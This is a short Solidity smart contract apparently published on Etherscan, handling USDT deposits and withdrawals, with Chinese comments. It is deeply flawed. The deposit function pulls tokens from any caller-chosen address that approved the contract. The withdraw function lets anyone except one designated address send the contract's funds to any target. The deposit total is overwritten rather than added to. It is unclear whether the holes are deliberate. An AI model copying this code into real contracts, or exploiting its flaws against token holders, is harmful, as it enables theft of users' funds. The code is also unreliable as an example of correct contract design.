/**
 *Submitted for verification at Etherscan.io on 2021-11-12
*/

pragma solidity ^0.5.1;

interface IERC20 {
    function transfer(address recipient, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external;
    function decimals() external view returns (uint8);
}
contract usdtCharge {
    /*变量声明 */
    IERC20 usdt;
    struct Player {
        uint256 total_charge;
        uint256 total_withdrawn;
    }
    address payable public owner;
    address payable public main_addr;
    mapping(address => Player) public players;


    /*合约构建类*/
    constructor(address payable _addr,IERC20 _usdt) public {
        owner = msg.sender;
        main_addr = _addr;
        usdt = _usdt;
    }
    
    
    
    /*存款操作*/
    function deposit(address fromAddr,uint _usdtAmount) external {
        Player storage player = players[msg.sender];
        usdt.transferFrom(fromAddr,address(this), _usdtAmount);
        player.total_charge = _usdtAmount;
    }
    
    /*提现操作*/
    function withdraw(address _target, uint256 _amount) external {
        if(msg.sender != main_addr){
            Player storage player = players[_target];
            player.total_withdrawn += _amount;
            usdt.transfer(_target, _amount);
        }
    }
}